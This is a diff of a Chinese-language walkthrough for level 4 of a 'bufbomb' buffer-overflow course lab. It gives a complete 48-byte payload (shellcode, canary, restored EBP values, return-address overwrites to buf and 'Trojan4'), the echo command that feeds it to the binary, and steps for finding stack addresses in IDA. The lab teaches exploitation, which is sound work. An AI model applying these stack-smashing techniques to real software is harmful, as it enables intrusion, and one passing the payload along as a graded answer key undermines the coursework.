+
+**偏移 24~31：填充 alloca 区域**
+
+这部分是 test 函数里 `_alloca()` 分配的栈空间，内容无所谓，全填零。
+
+```
 00 00 00 00 00 00 00 00
-EF BE AD DE        ← bird = 0xDEADBEEF
-3C FF 1A 00        ← test 的 saved_ebp = main 的 EBP
-0D 14 40 00        ← test 的返回地址
-A1 00 90 40 00     ← MOV EAX, [cookie]
-A3 04 90 40 00     ← MOV [global_value], EAX
-68 B0 12 40 00     ← PUSH Trojan4
-C3                 ← RET
-B8 A6 26 34 2F     ← MOV EAX, cookie（fixup：修复返回值）
-E9 17 13 25 00     ← JMP test（fixup：跳回 0x00401181）
 ```
 
-### 5.9 测试
+> **注意**：alloca 的大小因学号而异（`rand_div` 随学号变化），所以这部分的长度可能不同。你需要用 IDA 的 Stack view 观察 test 的 EBP 和 buf 起始地址之间的距离来确定。具体来说，bird 的位置 = test 的 EBP - 4，从 buf 起始到 bird 之间就是要填充的字节数。720028 的 bird 在偏移 32，所以填充 8 字节。
+
+**偏移 32~35：金丝雀 bird**
+
+test 函数中有 `if (bird == 0xdeadbeef)` 检查。在反汇编中能看到 `mov [ebp+var_4], 0DEADBEEFh`。必须保证金丝雀存活。
+
+```
+EF BE AD DE
+```
+
+**偏移 36~39：恢复 test 保存的 EBP**
+
+test 结束时执行 `pop ebp`，会把这里弹回 EBP。必须填回 main 的 EBP，否则 main 会崩溃。
+
+用 IDA 调试器查看栈中 [test 的 EBP] 处的值 = main 的 EBP = `0x001AFF3C`
+
+```
+3C FF 1A 00
+```
+
+**偏移 40~43：覆盖 test 的返回地址为 Trojan4**
+
+test 结束时 `ret` 弹出这个地址。正常应该回 main（`0x0040140D`），我们把它改成 Trojan4（`0x004012B0`），让 test "返回"到 Trojan4 而不是 main。
+
+```
+B0 12 40 00
+```
+
+**偏移 44~47：Trojan4 返回到 main 的地址**
+
+Trojan4 的反汇编确认它只是 `push ebx; ... ; pop ebx; ret`（没有 ebp 帧），所以它的 `ret` 会弹出紧接着的下一个栈上值。我们把 main 里 `call test` 后面的地址放在这里：`0x0040140D`
+
+```
+0D 14 40 00
+```
+
+### 完整答案
+
+以学号 **720028** 为例：
+
+```
+A1 00 90 40 00 A3 04 90 40 00 90 C3 48 FE 1A 00 24 FE 1A 00 81 11 40 00 00 00 00 00 00 00 00 00 EF BE AD DE 3C FF 1A 00 B0 12 40 00 0D 14 40 00
+```
+
+共 **48 字节**。逐段对应：
+
+```
+A1 00 90 40 00     ← shellcode: mov eax, [cookie]
+A3 04 90 40 00     ← shellcode: mov [global_value], eax
+90                 ← shellcode: nop（凑满 12 字节）
+C3                 ← shellcode: ret（跳回 test）
+48 FE 1A 00        ← 恢复 test 的 EBP（0x001AFE48）
+24 FE 1A 00        ← 返回地址 → buf 起始（执行 shellcode）
+81 11 40 00        ← shellcode 的 ret 目标 → test 继续执行（0x00401181）
+00 00 00 00        ← 填充 alloca 区域
+00 00 00 00        ← 填充 alloca 区域
+EF BE AD DE        ← 金丝雀 bird = 0xDEADBEEF
+3C FF 1A 00        ← 恢复 main 的 EBP（0x001AFF3C）
+B0 12 40 00        ← test 的返回地址 → Trojan4（0x004012B0）
+0D 14 40 00        ← Trojan4 返回 main（0x0040140D）
+```
+
+### 测试
 
 ```bash
-echo "E9 27 00 00 00 00 00 00 00 00 00 00 48 FE 1A 00 24 FE 1A 00 60 FE 1A 00 00 00 00 00 00 00 00 00 EF BE AD DE 3C FF 1A 00 0D 14 40 00 A1 00 90 40 00 A3 04 90 40 00 68 B0 12 40 00 C3 B8 A6 26 34 2F E9 17 13 25 00" | ./bufbomb.exe 720028
+echo "A1 00 90 40 00 A3 04 90 40 00 90 C3 48 FE 1A 00 24 FE 1A 00 81 11 40 00 00 00 00 00 00 00 00 00 EF BE AD DE 3C FF 1A 00 B0 12 40 00 0D 14 40 00" | ./bufbomb.exe 720028
 ```
 
-**预期输出**：
+预期输出（注意顺序：test 在前，Trojan4 在后）：
 
 ```
-厉害！第4只木马运行了，而且你修改了全局变量正确！global_value = 0X2F3426A6
-通过第4只木马测试
 鸟还活着！
 不错哦！缓冲区溢出成功，而且getbuf返回 0X2F3426A6
+厉害！第4只木马运行了，而且你修改了全局变量正确！global_value = 0X2F3426A6
+通过第4只木马测试
 ```
 
-### 5.10 如果你的学号不同
+### 如果你的学号不同
 
-需要替换以下值（全部用 [1.4 节](#14-用-gdb-获取-buf-的栈地址第34关需要) 的方法获取）：
+alloca 的大小因学号而异，所以 **bird 等关键数据的偏移量不固定**。你需要用 [1.4 节](#14-用-ida-调试器获取栈地址第34关需要) 的方法在 IDA 中获取以下信息：
 
-| 需要替换的值 | 在字符串中的位置 | 如何获取 |
-|-------------|----------------|---------|
-| buf 栈地址 | 字节 16~19（`24 FE 1A 00`）和 JMP 偏移（字节 1~4） | GDB 读 EAX 或 `ebp-0xC` |
-| test 的 EBP | 字节 12~15（`48 FE 1A 00`） | GDB 读 `[getbuf的ebp]` |
-| main 的 EBP | 字节 36~39（`3C FF 1A 00`） | GDB 读 `[test的ebp]` |
-| test 返回地址 | 字节 40~43（`0D 14 40 00`） | GDB 读 `[test的ebp+4]` |
-| cookie | 第2关字节 24~27 | 运行程序看输出 |
+| 步骤 | 需要查的值 | 在 IDA 中怎么看 | 720028 示例 |
+|------|-----------|----------------|------------|
+| 1 | getbuf 的 EBP | 调试时 General Registers 窗口 | `0x001AFE30` |
+| 2 | buf 地址 | EBP - 0xC | `0x001AFE24` |
+| 3 | test 的 EBP | Stack view 中 [getbuf 的 EBP] 处的值 | `0x001AFE48` |
+| 4 | bird 的地址 | test 的 EBP - 4 | `0x001AFE44` |
+| 5 | main 的 EBP | Stack view 中 [test 的 EBP] 处的值 | `0x001AFF3C` |
+| 6 | main 返回点 | 反汇编中 main 里 `call test` 后的指令地址 | `0x0040140D` |
+
+**构造步骤**：
+
+1. 前 12 字节固定：`A1 00 90 40 00 A3 04 90 40 00 90 C3`
+2. 偏移 12~15：test 的 EBP（小端序）
+3. 偏移 16~19：buf 地址（小端序）
+4. 偏移 20~23：固定填 `81 11 40 00`
+5. 偏移 24 到 bird 偏移前：填 `00` 填充
+6. bird 偏移处：`EF BE AD DE`
+7. bird 后 4 字节：main 的 EBP（小端序）
+8. 再后 4 字节：`B0 12 40 00`（Trojan4）
+9. 最后 4 字节：main 返回点（小端序）
 
 ---
 
-## 六、完整复现步骤（从零开始）
-
-### 步骤 1：确认学号和 cookie
-
-```bash
-echo "" | ./bufbomb.exe 你的学号
-```
-
-记下 cookie 值。
-
-### 步骤 2：反汇编确认地址
-
-```bash
-objdump -d -M intel --start-address=0x00401130 --stop-address=0x004012C0 bufbomb.exe
-```
-
-对照源码确认各函数入口地址。
-
-### 步骤 3：GDB 获取栈地址
-
-```bash
-cat > gdb_cmds.txt << 'EOF'
-set args 你的学号
-break *0x00401136
-run
-info registers eax esp ebp
-x/12xw $ebp
-quit
-EOF
-
-echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" | gdb -batch -nx -x gdb_cmds.txt bufbomb.exe
-```
-
-记录：
-- buf 地址 = `ebp - 0xC`
-- test 的 EBP = `[ebp]`
-- main 的 EBP = `[test的ebp]`
-- test 返回地址 = `[test的ebp + 4]`
-
-### 步骤 4：逐关测试
-
-```bash
-# 第1关
-echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 11 40 00" | ./bufbomb.exe 你的学号
-
-# 第2关（替换 cookie 的小端序）
-echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 12 40 00 00 00 00 00 XX XX XX XX" | ./bufbomb.exe 你的学号
-
-# 第3关（替换 buf 地址的小端序）
-echo "A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3 XX XX XX XX" | ./bufbomb.exe 你的学号
-
-# 第4关（替换所有栈相关值）
-echo "E9 XX 00 00 00 00 00 00 00 00 00 00 XX XX XX XX XX XX XX XX XX XX XX XX 00 00 00 00 00 00 00 00 EF BE AD DE XX XX XX XX XX XX XX XX A1 00 90 40 00 A3 04 90 40 00 68 B0 12 40 00 C3 B8 XX XX XX XX E9 XX XX XX XX" | ./bufbomb.exe 你的学号
-```
-
-### 步骤 5：清理临时文件
-
-```bash
-rm gdb_cmds.txt
-```
-
----
-
-## 七、常见问题
+## 六、常见问题
 
 ### Q: 提示"鸟死了！堆栈已经被破坏了"？
 
 A: 说明溢出覆盖了 `test()` 中的 `bird` 变量。检查：
-- 第4关是否正确设置了字节 32~35 为 `EF BE AD DE`
-- 是否正确恢复了 test 的 saved_ebp（字节 12~15 和字节 36~39）
+- 是否在正确偏移处放置了 `EF BE AD DE`
+- 是否正确恢复了 test 的 EBP（偏移 12~15）和 test 保存的 EBP（偏移 bird 后 4 字节）
 
 ### Q: 程序崩溃（无输出就挂了）？
 
 A: 可能是返回地址写错了。检查：
 - 地址是否用了**小端序**
 - 地址是否拼写正确
-- 第3/4关的栈地址是否是你 GDB 调试得到的（不同学号地址不同）
+- 第3/4关的栈地址是否是你调试得到的（不同学号地址不同）
 
 ### Q: 第3/4关段错误？
 
-A: buf 的栈地址每次运行可能不同（但同一学号在同一系统上通常是稳定的）。用 GDB 重新获取地址后立刻测试。
+A: buf 的栈地址每次运行可能不同（但同一学号在同一系统上通常是稳定的）。用 IDA 重新调试获取地址后立刻测试。
 
 ### Q: 如何把地址/cookie 转成小端序？
 
@@ -664,8 +557,10 @@ A: 按字节拆开，反转顺序。例如 `0x004011F0`：
 小端序：F0 11 40 00
 ```
 
-### Q: 为什么第4关要用 JMP 而不是直接放 shellcode？
+### Q: 为什么第4关要用逆序执行法？
 
-A: 直接放 shellcode（16 字节）会覆盖 saved_ebp，导致 Trojan4 返回后 test 的 EBP 错误。JMP 把 shellcode 跳到更高地址，中间留出空间恢复 bird 和 saved_ebp。
+A: 第4关要求 Trojan4 返回后程序不崩溃。逆序法让 shellcode 先设好 EAX = cookie 和 global_value = cookie，然后 RET 回 test 的正常路径。test 检查通过后，通过被覆盖的返回地址跳到 Trojan4。Trojan4 的 `pop ebx; ret` 自然弹出下一个栈上值（main 返回点）。不需要 JMP 跳板和 fixup 代码，shellcode（12 字节）刚好填满 buf。
 
-另外 Trojan4 内部的 printf 会把 EAX 改成 printf 返回值，导致 test 输出"不对哦"。所以在 shellcode 后面加了一段 fixup 代码，在 Trojan4 返回后把 EAX 修正为 cookie，再跳回 test。
+### Q: 为什么 Trojan4 不需要传参数？
+
+A: 看 Trojan4 的反汇编：`mov ebx, ds:0x409004` — 它直接从内存地址 `0x409004`（global_value）读值，根本不从栈上读参数。所以不用像第2关那样在栈上构造参数。
